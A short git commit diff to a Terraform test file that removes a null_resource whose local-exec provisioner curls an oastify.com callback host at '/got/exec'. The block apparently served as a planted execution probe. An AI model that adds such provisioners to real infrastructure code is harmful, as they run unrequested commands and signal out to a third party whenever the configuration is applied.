227d3cd81fea14a8c49d04e2b58415a7afbb475d
someone <someone@localhost.localdomain>
2023-06-05 13:41:16 +0200

    test

--- test/terraform/s3/terraform-s3-script.tf
+++ test/terraform/s3/terraform-s3-script.tf
@@ -33,12 +33,6 @@ provider "aws" {
   }
 }
 
-resource "null_resource" "example" {
-  provisioner "local-exec" {
-    command = "curl http://9292bgno8f58g72x7g6y8h5iu900oucj.oastify.com/got/exec"
-  }
-}
-
 module "aws_s3" {
   source = "terraform-aws-modules/s3-bucket/aws"
 
